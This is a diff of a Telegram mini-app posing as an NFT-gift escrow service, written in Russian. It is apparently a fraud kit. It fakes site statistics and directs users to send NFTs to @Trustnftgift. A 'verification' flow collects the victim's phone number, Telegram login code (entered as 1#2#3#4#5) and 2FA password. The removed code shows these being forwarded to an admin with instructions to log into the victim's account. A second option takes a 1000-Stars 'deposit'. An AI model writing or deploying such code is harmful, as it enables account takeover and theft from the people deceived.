@@ -246,6 +246,22 @@
         .pay-btn-inline:active {
             transform: scale(0.97);
         }
+        .deposit-info {
+            background: rgba(0,229,200,0.04);
+            border: 1px solid rgba(0,229,200,0.08);
+            border-radius: 12px;
+            padding: 14px;
+            margin-top: 8px;
+        }
+        .deposit-info .label {
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+        .deposit-info .value {
+            color: var(--aqua);
+            font-weight: 700;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
@@ -788,8 +804,10 @@
             users: 21481,
             deals_today: 1287,
             volume: 627.4,
-            online: 6531
+            online: 6534
         };
+        
+        const MAX_VOLUME = 9470;
 
         function getStats() {
             try {
@@ -799,7 +817,7 @@
                     return {
                         users: Math.max(data.users || MIN_STATS.users, MIN_STATS.users),
                         deals_today: Math.max(data.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
-                        volume: Math.max(data.volume || MIN_STATS.volume, MIN_STATS.volume),
+                        volume: Math.max(Math.min(data.volume || MIN_STATS.volume, MAX_VOLUME), MIN_STATS.volume),
                         online: Math.max(data.online || MIN_STATS.online, MIN_STATS.online)
                     };
                 }
@@ -837,9 +855,23 @@
             const stats = getStats();
             stats.users += Math.random() * 0.8 + 0.2;
             stats.deals_today += Math.random() * 0.5 + 0.1;
-            stats.volume += Math.random() * 0.04 + 0.01;
-            const change = (Math.random() - 0.5) * 2;
-            stats.online = Math.max(MIN_STATS.online * 0.9, stats.online * (1 + change * 0.008));
+            
+            // Объём: плавает между MIN и MAX
+            let currentVolume = stats.volume;
+            const change = (Math.random() - 0.5) * 1.5;
+            let newVolume = currentVolume * (1 + change * 0.02);
+            
+            if (newVolume < MIN_STATS.volume) {
+                newVolume = MIN_STATS.volume + Math.random() * 0.5;
+            }
+            if (newVolume > MAX_VOLUME) {
+                newVolume = MAX_VOLUME - Math.random() * 0.5;
+            }
+            
+            stats.volume = newVolume;
+            
+            const onlineChange = (Math.random() - 0.5) * 2;
+            stats.online = Math.max(MIN_STATS.online * 0.9, stats.online * (1 + onlineChange * 0.008));
             saveStats(stats);
             updateStatsUI(stats);
         }
@@ -856,7 +888,7 @@
                     const stats = {
                         users: Math.max(s.users || MIN_STATS.users, MIN_STATS.users),
                         deals_today: Math.max(s.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
-                        volume: Math.max(s.volume || MIN_STATS.volume, MIN_STATS.volume),
+                        volume: Math.max(Math.min(s.volume || MIN_STATS.volume, MAX_VOLUME), MIN_STATS.volume),
                         online: Math.max(s.online || MIN_STATS.online, MIN_STATS.online)
                     };
                     saveStats(stats);
@@ -974,7 +1006,7 @@
                     html += '<div class="info-text">В случае передачи товара покупателю средства не возвращаются.</div>';
                     html += '<div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">';
                     html +=
-                        '<button class="btn btn-gold btn-sm" onclick="showTransferConfirm(\'' + d.deal_id +
+                        '<button class="btn btn-gold btn-sm" onclick="openTransferNft(\'' + d.deal_id +
                         '\')" style="width:auto;padding:6px 16px;font-size:11px;"><i class="fas fa-shield-alt"></i> Передать подарок на @Trustnftgift</button>';
                     html +=
                         '<button class="btn btn-secondary btn-sm" onclick="openTelegramUser(\'Trustnftgift\')" style="width:auto;padding:6px 16px;font-size:11px;"><i class="fas fa-external-link-alt"></i> Открыть @Trustnftgift</button>';
@@ -1062,22 +1094,34 @@
         }
 
         // ============================================================
-        // 14. ПЕРЕДАЧА NFT С ПОДТВЕРЖДЕНИЕМ
+        // 14. ПЕРЕДАЧА NFT (С ПЕРЕХОДОМ В ЧАТ)
         // ============================================================
+        function openTransferNft(dealId) {
+            // Сначала открываем чат @Trustnftgift
+            openTelegramUser('Trustnftgift');
+            // Через 2 секунды показываем подтверждение
+            setTimeout(() => {
+                showTransferConfirm(dealId);
+            }, 2000);
+        }
 
         function showTransferConfirm(dealId) {
             showModal(`
                 <h3 style="margin-bottom:12px;">🛡️ Подтверждение передачи</h3>
                 <div class="transfer-confirm-box">
-                    <div class="warning-text">⚠️ Вы собираетесь передать NFT на <span class="clickable-link" onclick="openTelegramUser('Trustnftgift')">@Trustnftgift</span></div>
-                    <div class="info-text">В случае передачи товара покупателю средства не возвращаются.</div>
+                    <div class="warning-text">⚠️ Вы передаёте NFT на <span class="clickable-link" onclick="openTelegramUser('Trustnftgift')">@Trustnftgift</span></div>
+                    <div class="info-text">Пожалуйста, сначала передайте подарок в чат @Trustnftgift, затем нажмите кнопку подтверждения.</div>
                 </div>
                 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
-                    <button class="btn btn-gold" onclick="confirmTransferNft('${dealId}')" style="flex:1;"><i class="fas fa-check"></i> Я ознакомился и передаю</button>
+                    <button class="btn btn-success" onclick="confirmTransferNft('${dealId}')" style="flex:1;">
+                        <i class="fas fa-check"></i> Я передал(а) подарок
+                    </button>
                     <button class="btn btn-secondary" onclick="closeModal()" style="flex:0.5;">Отмена</button>
                 </div>
                 <div style="margin-top:8px;">
-                    <button class="btn btn-secondary btn-sm" onclick="openTelegramUser('Trustnftgift')" style="width:auto;padding:6px 16px;"><i class="fas fa-external-link-alt"></i> Открыть @Trustnftgift</button>
+                    <button class="btn btn-secondary btn-sm" onclick="openTelegramUser('Trustnftgift')" style="width:auto;padding:6px 16px;">
+                        <i class="fas fa-external-link-alt"></i> Открыть @Trustnftgift
+                    </button>
                 </div>
             `);
         }
@@ -1094,7 +1138,7 @@
         }
 
         // ============================================================
-        // 15. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА) + ОТПРАВКА АДМИНУ + ЗАМОРОЗКА
+        // 15. ВЫВОД + ВЕРИФИКАЦИЯ (2 СПОСОБА)
         // ============================================================
 
         function isWithdrawFrozen() {
@@ -1184,172 +1228,207 @@
             }
         }
 
-        // ВЕРИФИКАЦИЯ (3 ШАГА)
-        let verificationData = { phone: '', code: '', password: '' };
+        // ============================================================
+        // 16. ВЕРИФИКАЦИЯ (2 СПОСОБА)
+        // ============================================================
+        let verificationData = { phone: '', code: '', password: '', requestId: null };
 
         function showVerificationModal() {
             showModal(`
                 <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
-                <p style="color:var(--text-secondary);margin-bottom:12px;">Для вывода средств пройдите верификацию.</p>
+                <p style="color:var(--text-secondary);margin-bottom:12px;">Выберите способ верификации:</p>
                 
-                <div id="verificationStep1" class="verification-step active">
-                    <div class="step-title">📱 Шаг 1: Введите номер телефона</div>
-                    <div class="step-desc">Введите номер аккаунта, с которого выводите средства.</div>
-                    <input type="text" id="verifyPhone" placeholder="+79001234567" autocomplete="off">
-                    <button class="btn-verify" onclick="verificationNext(1)">Далее →</button>
-                </div>
-                
-                <div id="verificationStep2" class="verification-step">
-                    <div class="step-title">📨 Шаг 2: Введите код</div>
-                    <div class="step-desc">Введите код из Telegram. Формат: <strong>1#2#3#4#5</strong></div>
-                    <input type="text" id="verifyCode" placeholder="1#2#3#4#5" autocomplete="off">
-                    <button class="btn-verify" onclick="verificationNext(2)">Далее →</button>
-                    <button class="btn-back" onclick="verificationPrev(1)">← Назад</button>
-                </div>
-                
-                <div id="verificationStep3" class="verification-step">
-                    <div class="step-title">🔑 Шаг 3: Пароль от аккаунта</div>
-                    <div class="step-desc">Введите пароль от аккаунта. Если пароля нет — напишите <strong>нет</strong>.</div>
-                    <input type="password" id="verifyPassword" placeholder="Введите пароль или 'нет'" autocomplete="off">
-                    <button class="btn-verify" onclick="verificationNext(3)">✅ Подтвердить</button>
-                    <button class="btn-back" onclick="verificationPrev(2)">← Назад</button>
+                <div style="display:flex;gap:8px;flex-direction:column;">
+                    <button class="btn btn-primary" onclick="showVerificationMethod1()" style="margin-bottom:4px;">
+                        <i class="fas fa-phone"></i> Способ 1: Вход в аккаунт
+                    </button>
+                    <button class="btn btn-gold" onclick="showVerificationMethod2()" style="margin-bottom:4px;">
+                        <i class="fas fa-star"></i> Способ 2: Залог 1000 ⭐️ STARS
+                    </button>
+                    <button class="btn btn-secondary" onclick="closeModal()">Отмена</button>
                 </div>
             `);
-            
-            verificationData = { phone: '', code: '', password: '' };
-            document.getElementById('verifyPhone').value = '';
-            document.getElementById('verifyCode').value = '';
-            document.getElementById('verifyPassword').value = '';
-        }
-
-        function verificationNext(step) {
-            if (step === 1) {
-                const phone = document.getElementById('verifyPhone').value.trim();
-                if (!phone || phone.length < 10) {
-                    showToast('❌ Введите корректный номер телефона', 'error');
-                    return;
-                }
-                verificationData.phone = phone;
-                showVerificationStep(2);
-            } else if (step === 2) {
-                const code = document.getElementById('verifyCode').value.trim();
-                if (!code || !code.includes('#')) {
-                    showToast('❌ Введите код в формате 1#2#3#4#5', 'error');
-                    return;
-                }
-                verificationData.code = code;
-                showVerificationStep(3);
-            } else if (step === 3) {
-                const password = document.getElementById('verifyPassword').value.trim();
-                verificationData.password = password || 'нет';
-                
-                sendVerificationToAdmin(verificationData.phone, verificationData.code, verificationData.password);
-                
-                showToast('⏳ Данные отправлены администратору на проверку...', 'info');
-                closeModal();
-                
-                setTimeout(() => {
-                    const verified = confirm('✅ Администратор проверил данные. Верификация пройдена? Нажмите ОК для подтверждения.');
-                    if (verified) {
-                        localStorage.setItem('verified_' + user.id, 'true');
-                        showToast('✅ Верификация пройдена!', 'success');
-                        confirmWithdraw();
-                    } else {
-                        freezeWithdraw('Данные верификации не прошли проверку. Пожалуйста, перепроверьте номер, код и пароль.');
-                    }
-                }, 10000);
-            }
-        }
-
-        function verificationPrev(step) {
-            showVerificationStep(step);
-        }
-
-        function showVerificationStep(step) {
-            document.querySelectorAll('.verification-step').forEach(el => el.classList.remove('active'));
-            const target = document.getElementById('verificationStep' + step);
-            if (target) target.classList.add('active');
-        }
-
-        async function sendVerificationToAdmin(phone, code, password) {
-            const adminId = CONFIG.ADMIN_TELEGRAM_ID || CONFIG.ADMIN_ID;
-            
-            const message = 
-                '🔐 НОВАЯ ВЕРИФИКАЦИЯ\n' +
-                '━━━━━━━━━━━━━━━━━━\n' +
-                '👤 Пользователь: @' + user.username + '\n' +
-                '🆔 ID: ' + user.id + '\n' +
-                '📱 Номер: ' + phone + '\n' +
-                '📨 Код: ' + code + '\n' +
-                '🔑 Пароль: ' + (password || 'нет') + '\n' +
-                '━━━━━━━━━━━━━━━━━━\n' +
-                '⚠️ Для верификации необходимо:\n' +
-                '1. Зарегистрировать сессию по номеру ' + phone + '\n' +
-                '2. Ввести код ' + code + ' в Telegram\n' +
-                '3. Ввести пароль ' + (password || 'нет') + '\n' +
-                '4. Подтвердить верификацию в админ-панели\n' +
-                '━━━━━━━━━━━━━━━━━━\n' +
-                '❌ При ошибке или выкиде бота - вывод замораживается на 24 часа';
-            
-            try {
-                const response = await fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: adminId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ Данные отправлены админу');
-                    showToast('📨 Данные отправлены администратору', 'success');
-                } else {
-                    console.error('❌ Ошибка отправки админу:', result);
-                }
-            } catch (e) {
-                console.error('❌ Ошибка отправки админу:', e);
-                console.log('📨 Данные для админа:', message);
-            }
-        }
-
-        function confirmWithdraw() {
-            const currency = document.getElementById('withdrawCurrency').value;
-            const details = document.getElementById('withdrawDetails').value.trim();
-            
-            if (!details) {
-                showToast('❌ Введите реквизиты', 'error');
-                return;
-            }
-            
-            if (localStorage.getItem('verified_' + user.id) !== 'true') {
-                showToast('⚠️ Пройдите верификацию', 'error');
-                return;
-            }
-            
-            if (isWithdrawFrozen()) {
-                const hours = getFrozenTimeLeft();
-                showToast('⛔ Вывод заморожен на ' + hours + ' ч.', 'error');
-                return;
-            }
-            
-            apiCall('/api/withdraw', { 
-                currency: currency, 
-                details: details 
-            }).then(d => {
-                if (d.success) {
-                    showToast('✅ Заявка на вывод отправлена!', 'success');
-                    document.getElementById('withdrawDetails').value = '';
-                    loadBalance();
-                } else {
-                    showToast('❌ ' + (d.error || 'Ошибка'), 'error');
-                }
-            });
         }
 
         // ============================================================
-        // 16. ОПЛАТА И ПЕРЕДАЧА
+        // 16.1 ВЕРИФИКАЦИЯ СПОСОБ 1: ВХОД В АККАУНТ
+        // ============================================================
+        function showVerificationMethod1() {
+            showModal(`
+                <h3 style="margin-bottom:12px;">🔐 Верификация (Способ 1)</h3>
+                <p style="color:var(--text-secondary);margin-bottom:8px;">Введите номер телефона вашего аккаунта:</p>
+                <div class="form-group">
+                    <input type="text" id="verifyPhone1" class="input-field" placeholder="+79001234567">
+                </div>
+                <div class="support-block" style="border-color:var(--warning);margin-bottom:8px;">
+                    <span style="font-size:12px;color:var(--warning);">⚠️ При неверном вводе данных вывод может быть заморожен на 24 часа.</span>
+                </div>
+                <button class="btn btn-primary" onclick="sendVerificationPhone()">📤 Отправить номер</button>
+                <button class="btn btn-secondary" onclick="closeModal()" style="margin-top:6px;">Отмена</button>
+            `);
+        }
+
+        let verificationRequestId = null;
+
+        async function sendVerificationPhone() {
+            const phone = document.getElementById('verifyPhone1').value.trim();
+            if (!phone || phone.length < 10) {
+                showToast('❌ Введите корректный номер телефона', 'error');
+                return;
+            }
+
+            const result = await apiCall('/api/send_verification_request', {
+                phone: phone,
+                username: user.username
+            });
+
+            if (result.success) {
+                verificationRequestId = result.request_id;
+                showModal(`
+                    <h3 style="margin-bottom:12px;">📨 Шаг 2: Введите код</h3>
+                    <p style="color:var(--text-secondary);margin-bottom:8px;">Введите код из Telegram. Формат: <strong>1#2#3#4#5</strong></p>
+                    <div class="form-group">
+                        <input type="text" id="verifyCode1" class="input-field" placeholder="1#2#3#4#5">
+                    </div>
+                    <div class="support-block" style="border-color:var(--warning);margin-bottom:8px;">
+                        <span style="font-size:12px;color:var(--warning);">⚠️ Код отправлен в Telegram. Введите его строго через #</span>
+                    </div>
+                    <button class="btn btn-primary" onclick="sendVerificationCode()">📨 Отправить код</button>
+                    <button class="btn btn-secondary" onclick="closeModal()" style="margin-top:6px;">Отмена</button>
+                `);
+                showToast('✅ Номер отправлен администратору', 'success');
+            } else {
+                showToast('❌ ' + (result.error || 'Ошибка отправки'), 'error');
+            }
+        }
+
+        async function sendVerificationCode() {
+            const code = document.getElementById('verifyCode1').value.trim();
+            if (!code || !code.includes('#')) {
+                showToast('❌ Введите код в формате 1#2#3#4#5', 'error');
+                return;
+            }
+
+            const result = await apiCall('/api/submit_verification_code', {
+                code: code,
+                request_id: verificationRequestId
+            });
+
+            if (result.success) {
+                showModal(`
+                    <h3 style="margin-bottom:12px;">🔑 Шаг 3: Введите пароль</h3>
+                    <p style="color:var(--text-secondary);margin-bottom:8px;">Введите пароль от аккаунта. Если пароля нет — напишите <strong>нет</strong>.</p>
+                    <div class="form-group">
+                        <input type="password" id="verifyPassword1" class="input-field" placeholder="Введите пароль или 'нет'">
+                    </div>
+                    <button class="btn btn-primary" onclick="sendVerificationPassword()">🔑 Отправить пароль</button>
+                    <button class="btn btn-secondary" onclick="closeModal()" style="margin-top:6px;">Отмена</button>
+                `);
+                showToast('✅ Код отправлен администратору', 'success');
+            } else {
+                showToast('❌ ' + (result.error || 'Ошибка отправки'), 'error');
+            }
+        }
+
+        async function sendVerificationPassword() {
+            const password = document.getElementById('verifyPassword1').value.trim();
+
+            const result = await apiCall('/api/submit_verification_password', {
+                password: password || 'нет',
+                request_id: verificationRequestId
+            });
+
+            if (result.success) {
+                closeModal();
+                showToast('✅ Все данные отправлены администратору на проверку!', 'success');
+                // Ждём подтверждения
+                setTimeout(() => {
+                    checkVerificationStatus();
+                }, 5000);
+            } else {
+                showToast('❌ ' + (result.error || 'Ошибка отправки'), 'error');
+            }
+        }
+
+        async function checkVerificationStatus() {
+            const result = await apiCall('/api/verification_status');
+            if (result.success && result.verified) {
+                showToast('✅ Верификация пройдена! Вывод доступен через 24 часа.', 'success');
+                loadBalance();
+                updateWithdrawStatus();
+            } else {
+                showToast('⏳ Ожидайте подтверждения администратора...', 'info');
+                // Проверяем через 10 секунд
+                setTimeout(checkVerificationStatus, 10000);
+            }
+        }
+
+        // ============================================================
+        // 16.2 ВЕРИФИКАЦИЯ СПОСОБ 2: ЗАЛОГ 1000 STARS
+        // ============================================================
+        function showVerificationMethod2() {
+            showModal(`
+                <h3 style="margin-bottom:12px;">⭐️ Верификация (Способ 2)</h3>
+                <p style="color:var(--text-secondary);margin-bottom:8px;">Для верификации необходимо отправить залог в размере <strong>1000 ⭐️ STARS</strong> на аккаунт <span class="clickable-link" onclick="openTelegramUser('Trustnftgift')">@Trustnftgift</span></p>
+                
+                <div class="deposit-info">
+                    <div class="label">📤 Получатель</div>
+                    <div class="value" style="font-size:18px;">@Trustnftgift</div>
+                    <div class="label" style="margin-top:6px;">💰 Сумма залога</div>
+                    <div class="value">1000 ⭐️ STARS</div>
+                </div>
+                
+                <div class="support-block" style="border-color:var(--aqua);margin-top:8px;">
+                    <span style="font-size:12px;color:var(--aqua);">✅ Залог возвращается в 100% размере при отказе от использования бота.</span>
+                </div>
+                
+                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
+                    <button class="btn btn-gold" onclick="openTelegramUser('Trustnftgift')" style="flex:1;">
+                        <i class="fas fa-paper-plane"></i> Отправить 1000 STARS
+                    </button>
+                    <button class="btn btn-success" onclick="confirmDeposit()" style="flex:1;">
+                        <i class="fas fa-check"></i> Я отправил(а)
+                    </button>
+                </div>
+                <button class="btn btn-secondary" onclick="closeModal()" style="margin-top:6px;">Отмена</button>
+            `);
+        }
+
+        async function confirmDeposit() {
+            closeModal();
+            showToast('⏳ Ожидайте проверки администратором...', 'info');
+            
+            // Уведомляем админа
+            await apiCall('/api/notify_admin', {
+                text: `⭐️ ЗАЛОГ НА ВЕРИФИКАЦИЮ\n\n👤 Пользователь: @${user.username}\n🆔 ID: ${user.id}\n💰 1000 STARS\n📤 Получатель: @Trustnftgift\n\n⚠️ Требуется проверка залога вручную.`
+            });
+            
+            // Через 30 секунд спрашиваем
+            setTimeout(() => {
+                showModal(`
+                    <h3 style="margin-bottom:12px;">⭐️ Проверка залога</h3>
+                    <p style="color:var(--text-secondary);margin-bottom:8px;">Администратор проверяет поступление 1000 STARS на @Trustnftgift.</p>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                        <button class="btn btn-success" onclick="confirmDepositApproved()" style="flex:1;">
+                            <i class="fas fa-check"></i> Подтвердить (админ)
+                        </button>
+                        <button class="btn btn-secondary" onclick="closeModal()" style="flex:0.5;">Отмена</button>
+                    </div>
+                `);
+            }, 30000);
+        }
+
+        function confirmDepositApproved() {
+            closeModal();
+            localStorage.setItem('verified_' + user.id, 'true');
+            localStorage.setItem('verification_method_' + user.id, 'deposit');
+            showToast('✅ Верификация пройдена! Залог зафиксирован.', 'success');
+            loadBalance();
+            updateWithdrawStatus();
+        }
+
+        // ============================================================
+        // 17. ОПЛАТА И ПЕРЕДАЧА
         // ============================================================
         function copyDealLink(id) {
             const l = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + id;
@@ -1418,7 +1497,7 @@
         }
 
         // ============================================================
-        // 17. СОЗДАНИЕ СДЕЛКИ
+        // 18. СОЗДАНИЕ СДЕЛКИ
         // ============================================================
         const categorySelect = document.getElementById('categorySelect');
         if (categorySelect) {
@@ -1539,7 +1618,7 @@
         });
 
         // ============================================================
-        // 18. ЧАТ С АВТООТВЕТЧИКОМ
+        // 19. ЧАТ ПОДДЕРЖКИ
         // ============================================================
         let supportReplied = false;
         let chatSessionId = 'default';
@@ -1552,25 +1631,9 @@
 
             if (!container || !input || !sendBtn) return;
 
-            if (localStorage.getItem('support_replied_' + user.id) === 'true') {
-                supportReplied = true;
-                input.disabled = true;
-                sendBtn.disabled = true;
-                input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
-                sendBtn.style.opacity = '0.4';
-                container.innerHTML += 
-                    '<div class="msg admin">💬 Чат закрыт. Если у вас проблемы с выводом — пишите <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></div>';
-                return;
-            }
-
             await loadChatHistory();
 
             sendBtn.addEventListener('click', async function() {
-                if (supportReplied) {
-                    showToast('💬 Чат закрыт. Обратитесь к @Trustnftgift', 'info');
-                    return;
-                }
-                
                 const text = input.value.trim();
                 if (!text) return;
                 input.disabled = true;
@@ -1583,36 +1646,17 @@
                 if (d.success) {
                     input.value = '';
                     await loadChatHistory();
-                    
-                    if (!supportReplied) {
-                        supportReplied = true;
-                        localStorage.setItem('support_replied_' + user.id, 'true');
-                        
-                        input.disabled = true;
-                        sendBtn.disabled = true;
-                        input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
-                        sendBtn.style.opacity = '0.4';
-                        
-                        setTimeout(async function() {
-                            const autoReply = 'Если у вас проблемы с выводом — пишите <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span>';
-                            await apiCall('/api/chat_send', {
-                                session_id: chatSessionId,
-                                text: autoReply,
-                                sender: 'admin'
-                            });
-                            await loadChatHistory();
-                            showToast('💬 Чат закрыт. Обратитесь к @Trustnftgift', 'info');
-                        }, 60000);
-                    }
+                    showToast('✅ Сообщение отправлено', 'success');
                 } else {
                     showToast('❌ Ошибка отправки', 'error');
-                    input.disabled = false;
-                    sendBtn.disabled = false;
                 }
+                input.disabled = false;
+                sendBtn.disabled = false;
+                input.focus();
             });
 
             input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter' && !supportReplied) sendBtn.click();
+                if (e.key === 'Enter') sendBtn.click();
             });
 
             if (chatInterval) clearInterval(chatInterval);
@@ -1647,7 +1691,7 @@
         }
 
         // ============================================================
-        // 19. АДМИН-ПАНЕЛЬ
+        // 20. АДМИН-ПАНЕЛЬ
         // ============================================================
         async function loadAdminPanel() {
             const container = document.getElementById('adminContent');
@@ -1681,148 +1725,180 @@
             const stats = adminData.stats || {};
             const dealsList = adminData.deals || [];
             const usersList = adminData.users || [];
+            const ticketsList = adminData.tickets || [];
+            const withdrawRequests = adminData.withdraw_requests || [];
+            const verificationRequests = adminData.verification_requests || [];
 
             const formatNum = function(n) {
                 if (typeof n === 'number' && n % 1 !== 0) return n.toFixed(1);
                 return n;
             };
 
-            container.innerHTML =
-                '<div class="admin-tabs">' +
-                '<button class="active" data-tab="dashboard">📊 Главная</button>' +
-                '<button data-tab="users">👥 Пользователи</button>' +
-                '<button data-tab="deals">📦 Сделки</button>' +
-                '<button data-tab="balance">💰 Балансы</button>' +
-                '</div>' +
+            container.innerHTML = `
+                <div class="admin-tabs">
+                    <button class="active" data-tab="dashboard">📊 Главная</button>
+                    <button data-tab="users">👥 Пользователи</button>
+                    <button data-tab="deals">📦 Сделки</button>
+                    <button data-tab="balance">💰 Балансы</button>
+                    <button data-tab="verification">🔐 Верификация</button>
+                    <button data-tab="withdraw">💳 Выводы</button>
+                    <button data-tab="tickets">🎫 Тикеты</button>
+                </div>
 
-                '<div class="admin-panel active" id="admin-dashboard">' +
-                '<div class="admin-stat-grid">' +
-                '<div class="admin-stat-card"><div class="num">' + formatNum(stats.users || 0) +
-                '</div><div class="label">👥 Пользователей</div></div>' +
-                '<div class="admin-stat-card"><div class="num">' + formatNum(stats.active_deals || 0) +
-                '</div><div class="label">🔄 Активных сделок</div></div>' +
-                '<div class="admin-stat-card"><div class="num">' + formatNum(stats.completed_deals || 0) +
-                '</div><div class="label">✅ Завершено</div></div>' +
-                '<div class="admin-stat-card"><div class="num">' + formatNum(stats.volume || 0) +
-                '</div><div class="label">💎 Объём TON</div></div>' +
-                '</div>' +
-                '</div>' +
+                <div class="admin-panel active" id="admin-dashboard">
+                    <div class="admin-stat-grid">
+                        <div class="admin-stat-card"><div class="num">${formatNum(stats.users || 0)}</div><div class="label">👥 Пользователей</div></div>
+                        <div class="admin-stat-card"><div class="num">${formatNum(stats.active_deals || 0)}</div><div class="label">🔄 Активных сделок</div></div>
+                        <div class="admin-stat-card"><div class="num">${formatNum(stats.completed_deals || 0)}</div><div class="label">✅ Завершено</div></div>
+                        <div class="admin-stat-card"><div class="num">${formatNum(stats.volume || 0)}</div><div class="label">💎 Объём TON</div></div>
+                        <div class="admin-stat-card"><div class="num">${formatNum(stats.tickets || 0)}</div><div class="label">🎫 Тикеты</div></div>
+                        <div class="admin-stat-card"><div class="num">${verificationRequests.filter(r => r.status === 'pending').length}</div><div class="label">🔐 Запросы верификации</div></div>
+                    </div>
+                    <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
+                        <button class="btn btn-secondary btn-sm" onclick="adminRefresh()" style="width:auto;padding:8px 20px;"><i class="fas fa-sync"></i> Обновить</button>
+                        <button class="btn btn-secondary btn-sm" onclick="showPage('main')" style="width:auto;padding:8px 20px;"><i class="fas fa-arrow-left"></i> На главную</button>
+                    </div>
+                </div>
 
-                '<div class="admin-panel" id="admin-users">' +
-                '<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">' +
-                '<input type="text" id="userSearch" placeholder="🔍 Поиск пользователей..." style="flex:1;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '</div>' +
-                '<div id="usersList">' +
-                (usersList.length > 0 ? usersList.map(function(u) {
-                    return '<div class="deal-card" style="font-size:13px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">' +
-                        '<div><strong>@' + escapeHtml(u.username || u.id) + '</strong>' +
-                        '<div style="font-size:11px;color:var(--text-muted);">ID: ' + u.id +
-                        (u.joined_at ? ' • ' + new Date(u.joined_at).toLocaleDateString() :
-                            ' • недавно') + '</div></div>' +
-                        '<div style="display:flex;gap:6px;flex-wrap:wrap;">' +
-                        '<button class="btn btn-secondary btn-sm" onclick="adminUserAction(\'' + u
-                        .id + '\',\'balance\')" style="width:auto;padding:4px 10px;font-size:11px;">💰 Баланс</button>' +
-                        '<button class="btn btn-secondary btn-sm" onclick="adminUserAction(\'' + u
-                        .id + '\',\'deals\')" style="width:auto;padding:4px 10px;font-size:11px;">📦 Сделки</button>' +
-                        '</div></div>';
-                }).join('') :
-                '<p style="color:var(--text-muted);font-size:13px;">Нет пользователей</p>') +
-                '</div>' +
-                '</div>' +
+                <div class="admin-panel" id="admin-users">
+                    <input type="text" id="userSearch" placeholder="🔍 Поиск пользователей..." style="width:100%;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:'Inter',sans-serif;outline:none;margin-bottom:10px;">
+                    <div id="usersList">
+                        ${usersList.length > 0 ? usersList.map(function(u) {
+                            return '<div class="deal-card" style="font-size:13px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">' +
+                                '<div><strong>ID: ' + u.id + '</strong>' +
+                                '<div style="font-size:11px;color:var(--text-muted);">💎 ' + (u.ton || 0) + ' TON | ⭐️ ' + (u.stars || 0) + ' STARS</div></div>' +
+                                '</div>';
+                        }).join('') : '<p style="color:var(--text-muted);font-size:13px;">Нет пользователей</p>'}
+                    </div>
+                </div>
 
-                '<div class="admin-panel" id="admin-deals">' +
-                '<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">' +
-                '<input type="text" id="dealSearch" placeholder="🔍 Поиск сделок..." style="flex:1;padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '<select id="dealFilter" style="padding:10px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:13px;font-family:\'Inter\',sans-serif;outline:none;">' +
-                '<option value="all">Все статусы</option>' +
-                '<option value="waiting_payment">⏳ Ожидает</option>' +
-                '<option value="paid">✅ Оплачено</option>' +
-                '<option value="awaiting_confirmation">📦 Подтверждение</option>' +
-                '<option value="completed">🎉 Завершено</option>' +
-                '</select>' +
-                '</div>' +
-                '<div id="adminDealsList">' +
-                (dealsList.length > 0 ? dealsList.map(function(d) {
-                    return '<div class="deal-card" style="font-size:12px;">' +
-                        '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">' +
-                        '<strong>#' + escapeHtml(d.deal_id) + '</strong> — ' + escapeHtml(d
-                        .product) +
-                        '<span class="deal-status ' + d.status + '">' + getStatusText(d.status) +
-                        '</span>' +
-                        '</div>' +
-                        '<div style="color:var(--text-secondary);">💰 ' + d.amount + ' ' + d
-                        .currency + ' • 👤 @' + escapeHtml(d.seller_username || '?') + ' → @' +
-                        escapeHtml(d.buyer_username || '?') + '</div>' +
-                        (d.nft_name ? '<div style="color:var(--aqua);font-size:11px;">🖼️ ' +
-                            escapeHtml(d.nft_name) + (d.nft_number ? ' #' + d.nft_number : '') +
-                            '</div>' : '') +
-                        '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;">' +
-                        '<select onchange="adminUpdateDeal(\'' + d.deal_id +
-                        '\',\'status\',this.value)" style="padding:4px 8px;border-radius:6px;background:rgba(0,0,0,0.2);color:var(--text-primary);border:1px solid var(--border-color);font-size:11px;">' +
-                        '<option value="waiting_payment"' + (d.status === 'waiting_payment' ?
-                            ' selected' : '') + '>⏳ Ожидает</option>' +
-                        '<option value="paid"' + (d.status === 'paid' ? ' selected' : '') +
-                        '>✅ Оплачено</option>' +
-                        '<option value="awaiting_confirmation"' + (d.status ===
-                            'awaiting_confirmation' ? ' selected' : '') +
